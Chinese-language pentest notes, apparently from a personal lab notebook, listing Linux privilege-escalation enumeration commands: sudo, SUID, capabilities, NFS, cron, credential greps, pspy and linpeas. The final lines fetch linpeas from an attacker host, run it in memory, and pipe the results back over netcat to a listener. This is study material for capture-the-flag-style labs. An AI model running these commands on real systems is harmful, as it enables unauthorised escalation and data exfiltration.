# 手工枚举
注意观察sudo的环境变量是否设置了env_reset,env_keep+=LD_PRELOAD[[sudo环境变量提权]]
~~~
sudo -l
~~~
查看bash版本，bash版本小于4.2和4.4
~~~
bash --version
~~~
NFS配置查看[[NFS提权]] 查看有没有no_root_squash
~~~bash
cat /etc/exports
~~~

~~~
getcap -r / 2>/dev/null
~~~

~~~
/sbin/getcap -r / 2>/dev/null
~~~

~~~
ls -liah
~~~

~~~
ls -liah /etc/shadow
~~~

~~~
history
~~~

~~~
cat /etc/crontab
~~~

~~~
cat $PATH
~~~

~~~
env
~~~

~~~
find / -perm -u=s -type f 2>/dev/null
~~~
找到suid位后去[GTFObins](https://gtfobins.github.io/)找提权方法

~~~
find / -writable -type f -not -path "/proc/*" 2>/dev/null
~~~

~~~
grep -R -i pass /home/* 2>/dev/null
~~~

### pspy监视进程状态
~~~
https://github.com/DominicBreuker/pspy/releases
~~~
下载相对应的版本，传到靶机上

# 自动枚举
~~~
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
~~~
从内存中执⾏，结果发回kali
~~~
nc -lvnp 81 | tee linpeas.out #kali
~~~
~~~
curl 192.168.2.135/linpeas.sh | sh | nc 192.168.2.135 81 #靶机
~~~

